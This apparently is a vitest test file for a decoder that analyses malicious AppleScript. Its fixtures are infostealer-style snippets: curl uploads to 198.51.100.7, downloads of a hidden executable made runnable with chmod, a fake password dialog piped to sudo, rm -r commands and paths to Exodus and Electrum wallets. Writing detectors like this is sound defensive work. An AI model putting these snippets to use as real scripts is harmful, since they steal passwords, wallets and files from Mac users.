import { describe, it, expect } from 'vitest';
import { looksLikeAppleScript, decodeAppleScript } from '../src/applescript';

describe('looksLikeAppleScript', () => {
  it('detects `do shell script`', () => {
    expect(looksLikeAppleScript('do shell script "echo hi"')).toBe(true);
  });
  it('detects `tell application`', () => {
    expect(looksLikeAppleScript('tell application "Finder" to activate')).toBe(true);
  });
  it('does not flag JXA `doShellScript` (camelCase, no spaces)', () => {
    expect(looksLikeAppleScript('app.doShellScript("x")')).toBe(false);
  });
});

describe('decodeAppleScript', () => {
  it('extracts a literal `do shell script` command as a shell sink', () => {
    const r = decodeAppleScript('do shell script "echo hi"');
    expect(r.capturedStrings).toContain('echo hi');
    expect(r.events.some((e) => e.kind === 'shell' && e.detail === 'echo hi')).toBe(true);
  });

  it('resolves `&` concatenation and `set` variables', () => {
    const src = 'set u to "https://example.com/x"\nset c to "curl " & u\ndo shell script c';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl https://example.com/x');
  });

  it('drops trailing clauses like `with administrator privileges`', () => {
    const r = decodeAppleScript('do shell script "id" with administrator privileges');
    expect(r.capturedStrings).toContain('id');
  });

  it('unwraps a `set X to (do shell script "…")` wrapper and partials unknown vars', () => {
    const src = 'set r to (do shell script "echo wrapped")\ndo shell script "rm " & mystery';
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('echo wrapped'); // trailing ) stripped, resolved cleanly
    expect(r.capturedStrings).toContain('rm <mystery>'); // unresolved var rendered as a placeholder
  });

  it('cleanly resolves an escaped-quote curl exfil command', () => {
    const src = 'set s to (do shell script "curl -F \\"f=@/tmp/out.zip\\" http://198.51.100.7/x")';
    expect(decodeAppleScript(src).capturedStrings).toContain('curl -F "f=@/tmp/out.zip" http://198.51.100.7/x');
  });

  it('resolves system attribute through path concatenation (Task 2)', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'do shell script "ls " & profile',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('ls /Users/<USER>');
  });

  it('resolves a plain string variable through do shell script (Task 2)', () => {
    const src = [
      'set w to "/tmp/x/"',
      'do shell script "rm -r " & w',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('rm -r /tmp/x/');
  });

  it('does NOT store a list-literal map var; unresolved sink renders placeholder (Task 2)', () => {
    const src = [
      'set m to {{"a", "b"}}',
      'do shell script "echo " & m',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('echo <m>');
  });

});

describe('value evaluator', () => {
  it('resolves a concatenated URL from set-vars', () => {
    const src = [
      'set host to "198.51.100.7"',
      'set botPath to "/tmp/update"',
      'do shell script ("curl -o " & botPath & " https://" & host & "/zxc/app")',
    ].join('\n');
    expect(decodeAppleScript(src).capturedStrings).toContain('curl -o /tmp/update https://198.51.100.7/zxc/app');
  });

  it('unwraps `quoted form of` and leaves unknown vars as placeholders', () => {
    const src = 'do shell script ("echo " & quoted form of pwd & " | sudo -S id")';
    expect(decodeAppleScript(src).capturedStrings).toContain('echo <pwd> | sudo -S id');
  });

  it('does not split on `&` inside a string literal', () => {
    const src = 'do shell script "echo a & b"';
    expect(decodeAppleScript(src).capturedStrings).toContain('echo a & b');
  });

  it('resolves `quoted form of` wrapping a nested concat', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'set botUrl to "198.51.100.7"',
      'set botPath to (quoted form of (profile & "/.helper"))',
      'do shell script "curl -o " & botPath & " https://" & botUrl & "/zxc/app"',
      'do shell script "chmod +x " & botPath',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('curl -o /Users/<USER>/.helper https://198.51.100.7/zxc/app');
    expect(r.capturedStrings).toContain('chmod +x /Users/<USER>/.helper');
  });
});

describe('display dialog sink', () => {
  it('captures a credential-phishing display dialog', () => {
    const src = 'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)';
    const r = decodeAppleScript(src);
    expect(r.events.some((e) => e.kind === 'dialog' && e.detail.includes('[captures password]'))).toBe(true);
  });

  it('uses a short <varName> placeholder, not the full unresolved expression, for a var assigned from an unresolvable RHS', () => {
    const src = [
      'set pwd to text returned of (display dialog "macOS needs your password." default answer "" with hidden answer)',
      'do shell script ("echo " & quoted form of pwd & " | sudo -S id")',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.capturedStrings).toContain('echo <pwd> | sudo -S id');
  });
});

describe('run script recursion', () => {
  it('recovers a run-script argument for recursion', () => {
    const src = ['set inner to "do shell script \\"echo nested-payload\\""', 'run script inner'].join('\n');
    // The `do shell script` text inside the string literal on line 1 is DATA
    // (recovered later via `run script`), not a real sink
    expect(decodeAppleScript(src).capturedStrings).toEqual(['do shell script "echo nested-payload"']);
  });
});

describe('target-artifact enumeration', () => {
  it('enumerates targets from a walletMap {{...}} block with resolved vars', () => {
    const src = [
      'set username to (system attribute "USER")',
      'set profile to "/Users/" & username',
      'set library to "/Users/" & username & "/Library/Application Support/"',
      'set walletMap to {{"Exodus", library & "Exodus/"}, {"Electrum", profile & "/.electrum/wallets/"}}',
    ].join('\n');
    const r = decodeAppleScript(src);
    expect(r.targets.find((t) => t.label === 'Exodus')?.path)
      .toBe('/Users/<USER>/Library/Application Support/Exodus/');
    expect(r.targets.find((t) => t.label === 'Electrum')?.path).toContain('.electrum');
  });

  it('yields targets: [] when source has no {{...}} blocks', () => {
    expect(decodeAppleScript('do shell script "echo hello"').targets).toEqual([]);
  });
});
